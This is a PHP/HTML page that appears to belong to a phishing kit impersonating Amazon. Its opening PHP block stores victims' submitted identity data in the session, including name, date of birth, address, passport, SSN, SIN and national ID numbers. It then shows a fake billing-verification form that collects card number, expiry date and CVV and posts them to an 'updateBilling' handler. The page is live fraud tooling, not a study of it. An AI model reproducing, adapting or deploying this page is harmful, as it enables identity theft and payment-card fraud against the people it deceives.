<?php
if($_GET['error'] == 1){
}else{
$_SESSION['fullname'] = $_POST['fullname'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['zipcode'] = $_POST['zipcode'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['passport'] = $_POST['passport'];
$_SESSION['numbid'] = $_POST['numbid'];
$_SESSION['naid'] = $_POST['naid'];
$_SESSION['citizenid'] = $_POST['citizenid'];
$_SESSION['civilid'] = $_POST['civilid'];
$_SESSION['qatarid'] = $_POST['qatarid'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['sin'] = $_POST['sin'];
$_SESSION['osidnumber'] = $_POST['osidnumber'];
$_SESSION['bans'] = $_POST['bans'];
$_SESSION['acno'] = $_POST['acno'];
}
?>
<html>
<head>
<title><?php echo $lang['billing']['title'];?></title>
<link rel='icon' href='../assets/img/favicon.ico'>
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script type='text/javascript' src="../assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="../assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="../assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="../assets/js/validate.php"></script>
<script type='text/javascript' src="../assets/js/validation.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
  <script>
  $(document).ready(function(){
  var bith = "dd/mm/yyyy";
  $("#sortcode").mask("99-99-99",{placeholder:"__-__-__"});
  $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
  $('input[name="phone"]').keyup(function(e) {
      if (/\D/g.test(this.value))
      {
        this.value = this.value.replace(/\D/g, '');
      }
    });
  });
  </script>
<?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<center>";
  } ?>

 <?php
  if($os == "Android" or $os == "iPhone") {
    echo '<header style="background-color:#232f3e;">
  <div class="hleft">
  <img style="margin-left:-15px;" src="../assets/img/logo.png" width="90px" height="30px"></img>
  </div>
  </header>';
  }else{
    echo '<br><header style="background-color:#fff;">
  <div class="hleft">
  <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
    height: 31px;
    width: 103px;" role="img" aria-label="Amazon"></i>
  </div>
  </header>';
  } 
  ?>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "</center>";
  } ?>
<center>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<br>";
  } ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>
<div class="a-section a-spacing-none auth-pagelet-mobile-container">
  <?php if($_GET['error'] == 1) {?>
    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading"><?php echo $lang['error']['double_cc1'];?></h4><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical" role="alert">
        
          <li><span class="a-list-item">
            <?php echo $lang['error']['double_cc2'];?>
          </span></li>
        
      </ul>
    </div></div></div>
      </div>
    <?php }
      ?>
    <?php if($setting['get_billing'] != "on" and $_GET['error'] != 1) {?>
    <div id="warnings" style='font-size:12px;font-family: Arial,sans-serif;'>
<h1><?php echo $lang['billing']['verif'];?></h1>
<span style="font-size:15px;font-family: Arial,sans-serif;"><?php echo $lang['billing']['desc_verif'];?></span>
<br>
<br><br>
 </div>
    <?php }
      ?>
 <form action='updateBilling?session=<?php echo $key;?>' method='post' name='add' id='details' >
<div id="formbilling">
  <h4><?php echo $lang['billing']['enter'];?></h4>
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
    <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" style="" placeholder="<?php echo $lang['billing']['nameon'];?>" name="ccname" id="ccname" autocorrect="off" autocapitalize="off">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="<?php echo $lang['billing']['ccno'];?>" onkeyup="ccc();" name="ccno" maxlength="16" id="ccno" autocorrect="off" autocapitalize="off">
  </div><br>
  <h4><?php echo $lang['billing']['exp'];?></h4>
    <div style="border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:40%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <select name='exp_bulan' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required>
       <option value='01' selected="selected">01</option>
       <option value='02'>02</option>
       <option value='03'>03</option>
       <option value='04'>04</option>
       <option value='05'>05</option>
       <option value='06'>06</option>
       <option value='07'>07</option>
       <option value='08'>08</option>
       <option value='09'>09</option>
       <option value='10'>10</option>
       <option value='11'>11</option>
       <option value='12'>12</option>
    </select>
    
  </div>
  <div style="margin-left:border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:40%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <select name='exp_tahun' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required>
       <option value='19' selected="selected">2019</option>
       <option value='20'>2020</option>
       <option value='21'>2021</option>
       <option value='22'>2022</option>
       <option value='23'>2023</option>
       <option value='24'>2024</option>
       <option value='25'>2025</option>
       <option value='26'>2026</option>
       <option value='27'>2027</option>
       <option value='28'>2028</option>
       <option value='29'>2029</option>
       <option value='30'>2030</option>
    </select>

  </div><br><br>
  <h4><?php echo $lang['billing']['secode'];?></h4>
  <div style="border-top-color: #949494;padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="CVV" name="cvv" onkeyup="check_additional();" id="cvv" maxlength="4" autocorrect="off" autocapitalize="off">
  </div>
  <div id="amexcid"></div>
  <?php echo $card;?>
<br>
<input type='submit' id="submit_cc" class='button a-button-text' style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='<?php echo $lang['billing']['update'];?>'>
</div></div>

</form>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
  echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                    <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">
                        <ul class="nav-ftr-horiz ">
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_cou?ie=UTF8&amp;id=cou" class="nav-a"><?php echo $lang['footer']['condi'];?></a></li>
                            <li class="nav-li "><a href="/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496" class="nav-a"><?php echo $lang['footer']['privacy'];?></a></li>
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_iba?ie=UTF8&amp;id=201308670" class="nav-a"><?php echo $lang['footer']['help'];?></a></li>
                        </ul>
                        <div id="nav-ftr-copyright"><?php echo $lang['footer']['copyright'];?></div>
                    </div>
                </footer>
<?php }?>
</body>
</html>
